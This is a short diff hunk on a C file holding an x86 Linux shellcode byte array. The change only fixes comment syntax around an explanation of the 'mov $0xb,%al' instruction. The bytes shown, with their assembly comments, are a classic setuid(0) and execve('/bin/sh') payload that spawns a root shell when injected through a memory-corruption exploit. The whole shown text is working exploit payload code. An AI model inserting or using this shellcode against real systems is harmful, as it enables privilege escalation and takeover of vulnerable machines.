@@ -7,8 +7,8 @@ const char shellcode[]=
 	"\xcd\x80"		// int	$0x80
 
 	"\xb0\x0b"		// mov	$0xb,%al (So you'll get segfault   if it's not able
-to do the setuid(0). If you don't want this you can write "\x6a\x0b\x58"
-instead of "\xb0\x0b", but the shellcode will be 1 byte longer
+// to do the setuid(0). If you don't want this you can write "\x6a\x0b\x58"
+// instead of "\xb0\x0b", but the shellcode will be 1 byte longer
 	"\x99"			// cltd
 	"\x52"			// push	%edx
 	"\x68\x2f\x2f\x73\x68"	// push	$0x68732f2f
